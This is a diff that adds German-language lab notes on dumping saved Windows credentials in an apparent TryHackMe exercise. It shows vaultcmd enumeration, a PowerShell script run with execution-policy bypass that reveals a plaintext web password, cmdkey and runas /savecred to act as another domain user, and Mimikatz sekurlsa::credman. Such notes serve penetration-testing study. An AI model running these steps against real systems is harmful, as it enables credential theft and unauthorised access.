@@ -308,8 +308,127 @@ nochmal aus und erhalten den DUMP.
 
 # Windows Credential Manager
 
+Jetzt geht es um den Windows Credential Manager und wir aus diesem System Credentials dumpen können.
+
+### What is Credentials Manager?
+
+Beim Credential Manager handelt es sich um ein Windows Feature das Login-Sensitive Informationen speichert für Webseiten, Anwendungen und Netzwerke. Er enthält Credentials wie Usernames, Passwörter und Internet Adressen. Es gibt vier Credential Kategoerien:
+
+- Web Credentials beinhaltet Authentication Details die im Internet Browser gespeichert sind
+- Windows Credentials enthalten Windows Authentication Details wie bspw. NTLM oder Kerberos
+- Generelle Credentials enthalten grundlegende Details wie clear-text Usernames und Passwörter
+- Certificate-basierte Credentials
+
+Beachte das die authentication Details im Benutzer Ordner gespeichert sind und nicht über andere Windows Accounts geteilt wird. Aufjedenfall sind sie aber im Speicher abgelegt.
+
+### Accessing Credential Manager
+
+Wir können auf den Windows Credential Manager über die GUI aufrufen (Control Panel > User Accounts > Credential Manager) oder über die Kommandozeile. Wir konzentrieren uns mehr auf die Kommandozeile und das GUI nicht verfügbar ist.
+
+![alt text](images/image2.png)
 
 
+Wir starten den Windows Credential Manager ***vaultcmd*** und schauen mal, welche Credentials gespeichert sind.
+
+```bash
+C:\Users\Administrator>vaultcmd /list
+Currently loaded vaults:
+        Vault: Web Credentials
+        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+        Vault: Windows Credentials
+        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
+        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
+```
+
+By Default hat Windows 2 Vaults, einer für Web Credentials und einer für Windows Credentials. Lass mal schauen ob sich etwas im Web Credentials Vault befindet:
+
+```bash
+C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
+Vault Properties: Web Credentials
+Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+Number of credentials: 1
+Current protection method: DPAPI
+```
+Der Output sagt uns, dass es einen Eintrag gibt. Lass uns tiefer gehen:
+
+```bash
+C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
+Credentials in vault: Web Credentials
+
+Credential schema: Windows Web Password Credential
+Resource: internal-app.thm.red
+Identity: THMUser Saved By: MSEdge
+Hidden: No
+Roaming: Yes
+```
+
+### Credential Dumping
+
+VaultCMD ist leider nicht in der Lage, das Password anzuzeigen, aber wir können ein PowerShell Script wie bspw. Get-WebCredentials.ps1 nutzen.
+
+```bash
+C:\Users\Administrator>powershell -ex bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
+PS C:\Users\Administrator> Get-WebCredentials
+
+UserName  Resource             Password     Properties
+--------  --------             --------     ----------
+THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
+```
+
+Damit haben wir schonmal ein Password für die interne Anwendung.
+
+### RunAS
+
+Eine alternative Methode um an gespeicherte Credentials zu kommen ist RunAs. Dieser Befehl erlaubt uns Windows Anwendungen oder Tools unter einem anderen User auszuführen. Das RunAs Tool hat unterschiedliche Kommando Argumente die in einem Windows System genutzt werden könnnen. Das ***/savecred*** Argument z.b. erlaubt uns die Credentials des Users im Windows Credentials Manager zu speichern. Wenn wir etwas beim nächsten mal als dieser User ausführen, wird RunAs nicht nach einem Passwort fragen.
+
+Lass das mal jetzt auf die Windows Maschine anwenden. Ein anderer Weg Credentials zu speichern ist ***cmdkey***, ein Tool das Windows Credentials anzeigt, erstellt und löscht. Das ***/list*** Argument zeigt alle gespeicherten Creds an, oder wir können mit ***/list:computername*** die angezeigten Details mehr spezifizieren.
+
+```bash
+C:\Users\thm>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=thm\thm-local
+    Type: Domain Password
+    User: thm\thm-local
+```
+
+Der Output zeigt uns an, dass wir ein Domain Password als thm\thm-local User gespeichert haben. Beachte dasss die gespeicherten Creds auch für andere Server gültig sein könnten. Lass uns jetzt runas nutzen um eine Windows Application als thm-local User auszuführen.
+
+```bash
+C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
+Attempting to start cmd.exe as user "THM.red\thm-local" ...
+```
+
+Es öffnet sich eine neue Kommandozeile und mit whoami bestätigen wir, dass wir CMD.exe als der thm-local User geöffnet haben. 
+
+### Mimikatz
+
+Mit Mimikatz geht das ganze natürlich auch ganz easy. 
+
+```bash
+C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::credman
+```
+
+# Domain Controller
 
 
 
